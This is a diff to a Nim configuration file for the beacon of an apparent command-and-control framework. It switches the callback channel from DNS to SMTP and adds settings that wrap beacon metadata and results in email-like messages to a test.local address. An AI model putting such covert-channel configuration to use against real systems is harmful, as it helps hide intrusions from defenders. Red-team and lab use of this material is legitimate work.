@@ -6,9 +6,9 @@ const
 -----END PRIVATE KEY-----"""
 
     # c2
-    protocol* = "dns://" # http://, https://, or dns://
+    protocol* = "smtp://" # http://, https://, dns:// or smtp://
     host* = "192.168.65.1"
-    port* = "53"
+    port* = "25"
 
     # check in
     check_in_max_retries* = 1
@@ -60,6 +60,19 @@ const
     dns_aaaa* = "www6."
     post_result_prefix* = "post."
     post_metadata_prefix* = "www."
+
+    # SMTP
+    smtp_client_name* = "client.com"
+    smtp_from_base_domain* = "test.local"
+    smtp_to_user* = "admin@test.local"
+    smtp_data_prefix* = ""
+    smtp_data_suffix* = ""
+    smtp_metadata_prefix* = "The following messages are encrypted with AES:"
+    smtp_callback_prefix* = "The following messages are encrypted with RSA:"
+    smtp_empty_data* = ""
+    smtp_noop_prefix* = "Trace: "
+    smtp_noop_suffix* = ""
+    smtp_noop_empty_response* = "250 "
 
     # Command
     # NOTICE: large download_size causes overflow? makes beacon exit unexpectly, larger stack may fix this
